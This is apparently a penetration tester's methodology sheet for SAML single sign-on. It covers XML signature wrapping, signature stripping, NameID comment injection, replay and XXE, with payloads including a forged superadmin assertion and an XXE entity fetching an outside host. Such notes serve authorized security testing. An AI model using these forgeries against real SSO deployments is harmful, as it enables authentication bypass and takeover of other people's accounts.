# SAML

**What it is:** Flaws in SAML SSO assertion handling → auth bypass, account takeover, privilege escalation. The signature *is* the trust model; break it, dodge it, or make the validator and the app disagree about what was signed, and you become whoever you claim to be.

## Where to look
- ACS endpoints: `/saml/acs`, `/saml/consume`, `/sso/saml`, `/saml2/acs`, `/simplesaml/module.php/saml/sp/`, `/auth/saml2/`, `/adfs/ls/`, `/Shibboleth.sso/SAML2/POST`.
- Metadata: `/saml/metadata`, `/sp/metadata.xml`, `/FederationMetadata/2007-06/FederationMetadata.xml` — leaks certs, entityID, ACS URLs, accepted bindings.
- Params: `SAMLResponse`, `SAMLRequest`, `RelayState`, `SigAlg`, `Signature` (redirect binding puts sig in the query string).

## Decode / re-encode cheat
- POST binding: `SAMLResponse` = **base64** only.
- Redirect binding: `SAMLRequest` = **base64 + raw DEFLATE** (no zlib header).
```bash
# decode redirect-binding request
echo 'SAMLReq...' | python3 -c 'import sys,base64,zlib;print(zlib.decompress(base64.b64decode(sys.stdin.read()),-15).decode())'
# re-encode
python3 -c 'import sys,base64,zlib;d=open("a.xml","rb").read();print(base64.b64encode(zlib.compress(d)[2:-4]))'
```
`RelayState` is often reflected → open-redirect / XSS sink; and sometimes trusted for post-login landing.

## Test steps — signature bypass
- [ ] **XSW1–XSW8 (XML Signature Wrapping):** duplicate/relocate the signed element, inject a forged assertion the app *reads* but the validator *ignores*. The 8 variants differ by where the signed copy hides (wrapped in an added element, moved to `<Extensions>`, kept as sibling with a copied/removed `ID`, response-level vs assertion-level signature). Spray all 8 with SAML Raider; each targets a different XPath/`Reference URI` resolution bug.
- [ ] **Signature exclusion / stripping:** delete `<ds:Signature>` entirely → still accepted? Many SPs verify *if present* but don't *require* presence.
- [ ] **`Reference URI` mismatch:** point the signed `Reference URI="#_x"` at an element that isn't the one carrying the identity → signature "valid", identity unsigned.
- [ ] **Certificate faking / self-signed:** clone the SP-trusted cert's Subject but self-sign (SAML Raider "send certificate" → re-sign). Works when SP checks cert fields, not the chain/thumbprint.
- [ ] **Key confusion / algorithm downgrade:** swap `SignatureMethod` to a weaker alg; if cert (public key) is known, try HMAC where the public key becomes the HMAC secret. Also `SigAlg` downgrade on redirect binding.
- [ ] **Unsigned response wrapping a signed assertion (or vice-versa):** SP verifies assertion sig but trusts response-level `Status`/`NameID`, or the reverse.

## Test steps — parser / canonicalization
- [ ] **Comment / token splitting in `NameID`:** `admin@target.com<!--x-->.evil.com`. The signature covers the full canonical string, but a naive text extraction reads only the first text node → authenticates as `admin@target.com`. (This is the CVE-2017-11427 / Duo-disclosed class; hits many libs: python3-saml, OneLogin, Shibboleth, Clever.)
- [ ] **Nested text nodes:** `<NameID>admin<x>@evil</x>.com</NameID>` — DOM-vs-string extraction differential.
- [ ] **`xmlns` / namespace injection** to make signed and processed nodes canonicalize differently.
- [ ] **XXE / DTD** via the SAML XML parser (see `03-injection/05-xxe.md`) — `SAMLResponse` is fully attacker-controlled XML; test external entities, billion-laughs, SSRF via entity.
- [ ] **XSLT / transform abuse** in the `<ds:Transforms>` chain if a permissive transform is honored.

## Test steps — logic / replay
- [ ] **Replay:** resend a captured valid `SAMLResponse` — no one-time `Assertion ID` cache, no `NotOnOrAfter` / `NotBefore` enforcement, clock-skew too generous.
- [ ] **`InResponseTo` missing/unchecked** → forge/replay IdP-initiated assertions where only SP-initiated is expected.
- [ ] **`Audience` / `Recipient` / `Destination` not validated** → assertion minted for SP-A replayed at SP-B (cross-SP token reuse).
- [ ] **Attacker-controlled IdP / metadata poisoning:** if the SP accepts uploaded or URL-fetched IdP metadata, register your own IdP and sign your own assertions → total bypass.
- [ ] **`NameID` / `Subject` swap** to victim email/UID after capture (paired with any sig bypass above).
- [ ] **Attribute injection:** add/alter `Role`, `groups`, `isAdmin`, `memberOf` attributes → privilege escalation if the SP maps them.
- [ ] **Empty/omitted signature reference on assertion but present on response** with attacker-swapped assertion body.
- [ ] **Encryption downgrade:** `EncryptedAssertion` expected but plaintext `Assertion` accepted.

## Payloads / PoC

XSW type-2 (forged assertion as sibling after the legitimately-signed one; validator checks `#_signed`, app processes last/first):
```xml
<samlp:Response>
  <saml:Assertion ID="_signed">
    <saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
    <ds:Signature><ds:Reference URI="#_signed"/>...valid...</ds:Signature>
  </saml:Assertion>
  <saml:Assertion ID="_forged">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role"><saml:AttributeValue>superadmin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```
Comment-injection NameID (CVE-2017-11427 class):
```xml
<saml:NameID>admin@target.com<!---->.evil.com</saml:NameID>
```
XXE via SAMLResponse:
```xml
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://collab/xxe">]>
<samlp:Response>...<saml:NameID>&e;</saml:NameID>...</samlp:Response>
```

## Tools
Burp + **SAML Raider** (XSW1–8 automation, cert clone/re-sign, sig removal, message editor), `xmlsec1 --verify`, `python3` DEFLATE/base64 one-liners above, **SAMLReQuest**/**SAML-tracer** (Firefox) for flow capture.

## Impact
Full auth bypass / account takeover — authenticate as any user (often admin) without credentials. Cross-SP replay widens blast radius across a whole federation.

## Report notes
Include: decoded assertion **before → after**, the exact mutation (which XSW variant / where the comment landed / which reference was swapped), and proof the SP issued a session as the victim (screenshot of the post-login state + the victim's identity in-app). Forge only with IdP/domains you control. Note the library + version if fingerprintable — many are known-CVE and speed triage.
